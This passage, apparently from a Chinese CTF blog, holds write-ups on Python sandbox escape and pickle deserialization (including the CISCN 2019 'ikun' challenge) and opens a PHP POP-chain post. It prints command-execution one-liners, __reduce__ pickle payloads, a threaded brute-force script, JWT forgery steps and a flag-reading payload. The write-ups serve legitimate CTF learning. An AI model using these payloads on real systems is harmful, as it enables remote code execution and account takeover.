&quot;\u1d3a&quot;, &quot;\u2115&quot;, &quot;\u2116&quot;, &quot;\u24c3&quot;, &quot;\uff2e&quot;], &quot;R&quot;: [&quot;\u1d3f&quot;, &quot;\u20a8&quot;, &quot;\u211b&quot;, &quot;\u211c&quot;, &quot;\u211d&quot;, &quot;\u24c7&quot;, &quot;\uff32&quot;], &quot;V&quot;: [&quot;\u2164&quot;, &quot;\u2165&quot;, &quot;\u2166&quot;, &quot;\u2167&quot;, &quot;\u24cb&quot;, &quot;\u2c7d&quot;, &quot;\u33de&quot;, &quot;\uff36&quot;], &quot;Z&quot;: [&quot;\u2124&quot;, &quot;\u2128&quot;, &quot;\u24cf&quot;, &quot;\uff3a&quot;], &quot;^&quot;: [&quot;\uff3e&quot;], &quot;b&quot;: [&quot;\u1d47&quot;, &quot;\u24d1&quot;, &quot;\u3374&quot;, &quot;\uff42&quot;], &quot;f&quot;: [&quot;\u1da0&quot;, &quot;\u24d5&quot;, &quot;\u3399&quot;, &quot;\ufb00&quot;, &quot;\ufb01&quot;, &quot;\ufb02&quot;, &quot;\ufb03&quot;, &quot;\ufb04&quot;, &quot;\uff46&quot;], &quot;j&quot;: [&quot;\u02b2&quot;, &quot;\u2149&quot;, &quot;\u24d9&quot;, &quot;\u2c7c&quot;, &quot;\uff4a&quot;], &quot;n&quot;: [&quot;\u01cc&quot;, &quot;\u207f&quot;, &quot;\u24dd&quot;, &quot;\u3381&quot;, &quot;\u338b&quot;, &quot;\u339a&quot;, &quot;\u33b1&quot;, &quot;\u33b5&quot;, &quot;\u33bb&quot;, &quot;\uff4e&quot;], &quot;r&quot;: [&quot;\u02b3&quot;, &quot;\u1d63&quot;, &quot;\u24e1&quot;, &quot;\u33ad&quot;, &quot;\u33ae&quot;, &quot;\u33af&quot;, &quot;\uff52&quot;], &quot;v&quot;: [&quot;\u1d5b&quot;, &quot;\u1d65&quot;, &quot;\u2174&quot;, &quot;\u2175&quot;, &quot;\u2176&quot;, &quot;\u2177&quot;, &quot;\u24e5&quot;, &quot;\uff56&quot;], &quot;z&quot;: [&quot;\u1dbb&quot;, &quot;\u24e9&quot;, &quot;\uff5a&quot;], &quot;~&quot;: [&quot;\uff5e&quot;], &quot;!&quot;: [&quot;\u203c&quot;, &quot;\u2049&quot;, &quot;\ufe15&quot;, &quot;\ufe57&quot;, &quot;\uff01&quot;], &quot;%&quot;: [&quot;\ufe6a&quot;, &quot;\uff05&quot;], &quot;)&quot;: [&quot;\u207e&quot;, &quot;\u208e&quot;, &quot;\ufe36&quot;, &quot;\ufe5a&quot;, &quot;\uff09&quot;], &quot;-&quot;: [&quot;\ufe63&quot;, &quot;\uff0d&quot;], &quot;1&quot;: [&quot;\u00b9&quot;, &quot;\u00bc&quot;, &quot;\u00bd&quot;, &quot;\u2081&quot;, &quot;\u2150&quot;, &quot;\u2151&quot;, &quot;\u2152&quot;, &quot;\u2153&quot;, &quot;\u2155&quot;, &quot;\u2159&quot;, &quot;\u215b&quot;, &quot;\u215f&quot;, &quot;\u2460&quot;, &quot;\u2469&quot;, &quot;\u246a&quot;, &quot;\u246b&quot;, &quot;\u246c&quot;, &quot;\u246d&quot;, &quot;\u246e&quot;, &quot;\u246f&quot;, &quot;\u2470&quot;, &quot;\u2471&quot;, &quot;\u2472&quot;, &quot;\u2488&quot;, &quot;\u2491&quot;, &quot;\u2492&quot;, &quot;\u2493&quot;, &quot;\u2494&quot;, &quot;\u2495&quot;, &quot;\u2496&quot;, &quot;\u2497&quot;, &quot;\u2498&quot;, &quot;\u2499&quot;, &quot;\u249a&quot;, &quot;\u32c0&quot;, &quot;\u32c9&quot;, &quot;\u32ca&quot;, &quot;\u32cb&quot;, &quot;\u3359&quot;, &quot;\u3362&quot;, &quot;\u3363&quot;, &quot;\u3364&quot;, &quot;\u3365&quot;, &quot;\u3366&quot;, &quot;\u3367&quot;, &quot;\u3368&quot;, &quot;\u3369&quot;, &quot;\u336a&quot;, &quot;\u336b&quot;, &quot;\u33e0&quot;, &quot;\u33e9&quot;, &quot;\u33ea&quot;, &quot;\u33eb&quot;, &quot;\u33ec&quot;, &quot;\u33ed&quot;, &quot;\u33ee&quot;, &quot;\u33ef&quot;, &quot;\u33f0&quot;, &quot;\u33f1&quot;, &quot;\u33f2&quot;, &quot;\uff11&quot;], &quot;5&quot;: [&quot;\u2075&quot;, &quot;\u2085&quot;, &quot;\u215a&quot;, &quot;\u215d&quot;, &quot;\u2464&quot;, &quot;\u248c&quot;, &quot;\u32bf&quot;, &quot;\u32c4&quot;, &quot;\u335d&quot;, &quot;\u33e4&quot;, &quot;\uff15&quot;], &quot;9&quot;: [&quot;\u2079&quot;, &quot;\u2089&quot;, &quot;\u2468&quot;, &quot;\u2490&quot;, &quot;\u32c8&quot;, &quot;\u3361&quot;, &quot;\u33e8&quot;, &quot;\uff19&quot;], &quot;=&quot;: [&quot;\u207c&quot;, &quot;\u208c&quot;, &quot;\u2a75&quot;, &quot;\u2a76&quot;, &quot;\ufe66&quot;, &quot;\uff1d&quot;], &quot;A&quot;: [&quot;\u1d2c&quot;, &quot;\u24b6&quot;, &quot;\u3373&quot;, &quot;\u33df&quot;, &quot;\uff21&quot;], &quot;E&quot;: [&quot;\u1d31&quot;, &quot;\u2130&quot;, &quot;\u24ba&quot;, &quot;\uff25&quot;], &quot;I&quot;: [&quot;\u0132&quot;, &quot;\u1d35&quot;, &quot;\u2110&quot;, &quot;\u2111&quot;, &quot;\u2160&quot;, &quot;\u2161&quot;, &quot;\u2162&quot;, &quot;\u2163&quot;, &quot;\u2168&quot;, &quot;\u24be&quot;, &quot;\u337a&quot;, &quot;\uff29&quot;], &quot;M&quot;: [&quot;\u1d39&quot;, &quot;\u2133&quot;, &quot;\u216f&quot;, &quot;\u24c2&quot;, &quot;\u3386&quot;, &quot;\u3392&quot;, &quot;\u33ab&quot;, &quot;\u33b9&quot;, &quot;\u33bf&quot;, &quot;\u33c1&quot;, &quot;\uff2d&quot;], &quot;Q&quot;: [&quot;\u211a&quot;, &quot;\u24c6&quot;, &quot;\uff31&quot;], &quot;U&quot;: [&quot;\u1d41&quot;, &quot;\u24ca&quot;, &quot;\uff35&quot;], &quot;Y&quot;: [&quot;\u24ce&quot;, &quot;\uff39&quot;], &quot;]&quot;: [&quot;\ufe48&quot;, &quot;\uff3d&quot;], &quot;a&quot;: [&quot;\u00aa&quot;, &quot;\u1d43&quot;, &quot;\u1e9a&quot;, &quot;\u2090&quot;, &quot;\u2100&quot;, &quot;\u2101&quot;, &quot;\u24d0&quot;, &quot;\u33c2&quot;, &quot;\uff41&quot;], &quot;e&quot;: [&quot;\u1d49&quot;, &quot;\u2091&quot;, &quot;\u212f&quot;, &quot;\u2147&quot;, &quot;\u24d4&quot;, &quot;\u32cd&quot;, &quot;\u32ce&quot;, &quot;\uff45&quot;], &quot;i&quot;: [&quot;\u0133&quot;, &quot;\u1d62&quot;, &quot;\u2071&quot;, &quot;\u2139&quot;, &quot;\u2148&quot;, &quot;\u2170&quot;, &quot;\u2171&quot;, &quot;\u2172&quot;, &quot;\u2173&quot;, &quot;\u2178&quot;, &quot;\u24d8&quot;, &quot;\u33cc&quot;, &quot;\uff49&quot;], &quot;m&quot;: [&quot;\u1d50&quot;, &quot;\u217f&quot;, &quot;\u24dc&quot;, &quot;\u3383&quot;, &quot;\u338e&quot;, &quot;\u3396&quot;, &quot;\u339c&quot;, &quot;\u339f&quot;, &quot;\u33a1&quot;, &quot;\u33a3&quot;, &quot;\u33a5&quot;, &quot;\u33a7&quot;, &quot;\u33a8&quot;, &quot;\u33b3&quot;, &quot;\u33b7&quot;, &quot;\u33bd&quot;, &quot;\u33d4&quot;, &quot;\u33d5&quot;, &quot;\u33d6&quot;, &quot;\ufad1&quot;, &quot;\uff4d&quot;], &quot;q&quot;: [&quot;\u24e0&quot;, &quot;\uff51&quot;], &quot;u&quot;: [&quot;\u1d58&quot;, &quot;\u1d64&quot;, &quot;\u24e4&quot;, &quot;\uff55&quot;], &quot;y&quot;: [&quot;\u02b8&quot;, &quot;\u24e8&quot;, &quot;\uff59&quot;], &quot;}&quot;: [&quot;\ufe38&quot;, &quot;\ufe5c&quot;, &quot;\uff5d&quot;]}</code></pre><p>题目[ASIS 2019]Unicorn shop-&gt;wp<a href="https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis" target="_blank" rel="noopener">https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python反序列化漏洞</title>
      <link href="/2020/01/06/python-fan-xu-lie-hua-lou-dong/"/>
      <url>/2020/01/06/python-fan-xu-lie-hua-lou-dong/</url>
      
        <content type="html"><![CDATA[<h3 id="一、一些沙箱逃逸的姿势"><a href="#一、一些沙箱逃逸的姿势" class="headerlink" title="一、一些沙箱逃逸的姿势"></a>一、一些沙箱逃逸的姿势</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> osos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ifconfig'</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'ipconfig'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">import</span> commands <span class="token comment" spellcheck="true">#Linux python2</span>commands<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">'ifconfig'</span><span class="token punctuation">)</span>commands<span class="token punctuation">.</span>getstatusoutput<span class="token punctuation">(</span><span class="token string">'ifconfig'</span><span class="token punctuation">)</span><span class="token keyword">import</span> subprocesssubprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ipconfig'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">import</span> timeittimeit<span class="token punctuation">.</span>timeit<span class="token punctuation">(</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">,</span> number<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">import</span> platformplatform<span class="token punctuation">.</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span>platform<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> bufsize<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">import</span> ptypty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token keyword">import</span> cgicgi<span class="token punctuation">.</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span></code></pre><p>其实还有很多很多，记得大一去省赛的时候有个能python的，然后其他的和ssti差不多利用了<a href="https://kit4y.github.io/2019/11/19/flask-dao-ssti/">https://kit4y.github.io/2019/11/19/flask-dao-ssti/</a></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">一文看懂Python沙箱逃逸</a><br><a href="https://github.com/bit4woo/python_sec" target="_blank" rel="noopener">python安全和代码审计相关资料收集https://github.com/bit4woo/python_sec</a></p><h3 id="二、python中的序列化与反序列化"><a href="#二、python中的序列化与反序列化" class="headerlink" title="二、python中的序列化与反序列化"></a>二、python中的序列化与反序列化</h3><p>！python反序列化的类不需要提前声明</p><h4 id="用于序列化的两个模块-pickle-json"><a href="#用于序列化的两个模块-pickle-json" class="headerlink" title="用于序列化的两个模块/pickle+json"></a>用于序列化的两个模块/pickle+json</h4><p>　　json：用于字符串和Python数据类型间进行转换<br>　　pickle: 用于python特有的类型和python的数据类型间进行转换<br>　　json提供四个功能：dumps,dump,loads,load<br>　　pickle提供四个功能：dumps,dump,loads,load</p><h4 id="Pickle的支持类型"><a href="#Pickle的支持类型" class="headerlink" title="Pickle的支持类型"></a>Pickle的支持类型</h4><pre><code>1. 所有python支持的原生类型：布尔值，整数，浮点数，复数，字符串，字节，None。2. 由任何原生类型组成的列表，元组，字典和集合。3. 函数，类，类的实例</code></pre><h4 id="pickle模块中常用的方法有："><a href="#pickle模块中常用的方法有：" class="headerlink" title="pickle模块中常用的方法有："></a>pickle模块中常用的方法有：</h4><ol><li>pickle.dump(obj, file, protocol=None,)<br>必填参数obj表示将要封装的对象<br>必填参数file表示obj要写入的文件对象，file必须以二进制可写模式打开，即“wb”<br>可选参数protocol表示告知pickler使用的协议，支持的协议有0,1,2,3，默认的协议是添加在Python 3中的协议3。　　　<br>dump 将数据通过特殊的形式转换为只有python语言认识的字符串，并写入文件</li></ol><pre><code>with open(&#39;D:/tmp.pk&#39;, &#39;w&#39;) as f:    pickle.dump(data, f)</code></pre><ol start="2"><li>pickle.load(file,*,fix_imports=True, encoding=”ASCII”, errors=”strict”)<br>必填参数file必须以二进制可读模式打开，即“rb”，其他都为可选参数<br>load 从数据文件中读取数据，并转换为python的数据结构</li></ol><pre><code>with open(&#39;D:/tmp.pk&#39;, &#39;r&#39;) as f:    data = pickle.load(f)</code></pre><ol start="3"><li><p>pickle.dumps(obj)：以字节对象形式返回封装的对象，不需要写入文件中</p></li><li><p>pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回</p></li></ol><h4 id="不加s为文件操作"><a href="#不加s为文件操作" class="headerlink" title="不加s为文件操作"></a>不加s为文件操作</h4><p>demo</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token keyword">import</span> picklelist1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>output <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'data.pkl'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>list1<span class="token punctuation">,</span> output<span class="token punctuation">)</span>output<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>生成的文件,其中使用不同协议生成的二进制文件不同，有0，1，2，3默认是3，但是读取都没问题<br><img src="1.png" alt=""><br>反序列化</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token keyword">import</span> picklepkl_file <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'data.pkl'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>data1 <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span>pkl_file<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data1<span class="token punctuation">)</span>pkl_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h4 id="加上s为字符串操作"><a href="#加上s为字符串操作" class="headerlink" title="加上s为字符串操作"></a>加上s为字符串操作</h4><p>为了方便我以十六进制输出一下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>str1<span class="token operator">=</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b16encode<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>输出</p><pre><code>b&#39;80035D7100284B014B024B03652E&#39;[1, 2, 3]</code></pre><h3 id="三、-reduce"><a href="#三、-reduce" class="headerlink" title="三、__reduce__()"></a>三、<code>__reduce__()</code></h3><p>python魔法方法详解<br><a href="https://github.com/MrKiven/PyZh/blob/master/docs/python-magic-methods-guide.rst" target="_blank" rel="noopener">https://github.com/MrKiven/PyZh/blob/master/docs/python-magic-methods-guide.rst</a></p><h4 id="reduce-介绍"><a href="#reduce-介绍" class="headerlink" title="__reduce__()介绍"></a><code>__reduce__()介绍</code></h4><blockquote><p>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 <strong>setstate</strong> 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）<br>简单一点就是反序列化的时候调用</p></blockquote><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> pickle<span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username         self<span class="token punctuation">.</span>password <span class="token operator">=</span> password     <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># 未导入os模块，通用</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#return eval,("__import__('os').system('calc.exe')",)</span>        <span class="token comment" spellcheck="true">#return map, (__import__('os').system, ('calc.exe',))</span>        <span class="token comment" spellcheck="true">#return map, (__import__('os').system, ['ls'])</span>        <span class="token comment" spellcheck="true"># 导入os模块</span>        <span class="token comment" spellcheck="true"># return (os.system, ('calc.exe',))</span>        <span class="token comment" spellcheck="true"># return eval, ("os.system('calc.exe')",)</span>        <span class="token comment" spellcheck="true">#return map, (os.system, ('calc.exe',))</span>        <span class="token comment" spellcheck="true"># return map, (os.system, ['calc.exe'])</span>admin <span class="token operator">=</span> Person<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span><span class="token string">'123456'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>admin<span class="token punctuation">)</span>user <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre><p>不过这样会导致user初构造失败为空</p><h3 id="四、题目：-CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#四、题目：-CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="四、题目：[CISCN2019 华北赛区 Day1 Web2]ikun"></a>四、题目：[CISCN2019 华北赛区 Day1 Web2]ikun</h3><p><a href="https://github.com/glzjin/CISCN_2019_northern_China_day1_web2" target="_blank" rel="noopener">https://github.com/glzjin/CISCN_2019_northern_China_day1_web2</a><br>意思就是提前有1000货币购买lv,界面上只有lv1-5<br><img src="2.png" alt=""><br>先爆破出lv6的购买区</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threading<span class="token keyword">import</span> queue<span class="token keyword">from</span> queue <span class="token keyword">import</span> Queue<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> <span class="token string">'http://ca563c26-7e4b-423f-847b-99ec2db675db.node3.buuoj.cn/info/'</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        new_url <span class="token operator">=</span> url<span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>new_url<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">requ</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token operator">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        u <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>u<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">"-"</span><span class="token punctuation">)</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>text            <span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> r<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\n--------------GotIt-------------------------"</span><span class="token operator">+</span>u<span class="token operator">+</span><span class="token string">"\n\n--------------"</span><span class="token punctuation">)</span>            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            q<span class="token punctuation">.</span>put<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>    text<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> each <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>requ<span class="token punctuation">)</span>        t<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>拿到id=1624<br><img src="3.png" alt=""><br>价格超级贵，所以抓包来改一些东西，比如价格尝试购买-这里很难受，你要抓一个进优惠购买的包，id改成1624<br>到这里<br><img src="4.png" alt=""><br>然后成功拿到了一个url</p><pre><code>http://ca563c26-7e4b-423f-847b-99ec2db675db.node3.buuoj.cn/b1g_m4mber</code></pre><p><img src="5.png" alt=""><br>然后下一步是jwt，可参考<a href="https://kit4y.github.io/2020/01/01/jwt/">https://kit4y.github.io/2020/01/01/jwt/</a><br>拿到<br><code>JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InN0NGNrIn0.3e4wG-w3yFP1kBvUc5dpJ8Vb-yV1N9VixpNXpX_1xLQ</code><br><img src="6.png" alt=""><br>思路很明确了，把username伪造成admin即可，所以先使用c-jwt-cracker爆破secret<br><img src="7.png" alt=""><br>然后伪造成功，发现源码给了<br><code>/static/asd1f654e683wq/www.zip</code><br>在admin.py发现</p><pre class=" language-python"><code class="language-python">@tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated<span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>        p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>则可以利用这个，因为这个系统是python2的，我们也用python2-而且python的类居然可以不用提前定义，直接反序列化</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">payload</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment" spellcheck="true">#return (eval,("__import__('os').system('whoami')",))</span>       <span class="token keyword">return</span> <span class="token punctuation">(</span>eval<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payload<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> a</code></pre><p>得到的a，抓包改一下丢become得到flag<br><img src="8.png" alt=""><br>不过不知道为啥，os的payload打不了？</p><h4 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h4><p><a href="https://xz.aliyun.com/t/2289" target="_blank" rel="noopener">https://xz.aliyun.com/t/2289</a><br><a href="https://www.zhaoj.in/read-5946.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-5946.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>萌新入门pop链</title>
      <link href="/2020/01/04/pop-lian/"/>
      <url>/2020/01/04/pop-lian/</url>
      
        <content type="html"><![CDATA[<h2 id="一、POP-ROP"><a href="#一、POP-ROP" class="headerlink" title="一、POP?ROP?"></a>一、POP?ROP?</h2><p>面向属性编程（Property-Oriented Programing） 用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。</p><p>ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集<br>POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：<code>进行反序列化的数据能够被用户输入所控制。</code></p><h2 id="二、初级利用"><a href="#二、初级利用" class="headerlink" title="二、初级利用"></a>二、初级利用</h2><p>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来。<br>举例<br>demo.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">lemon</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$ClassObj</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ClassObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">normal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token 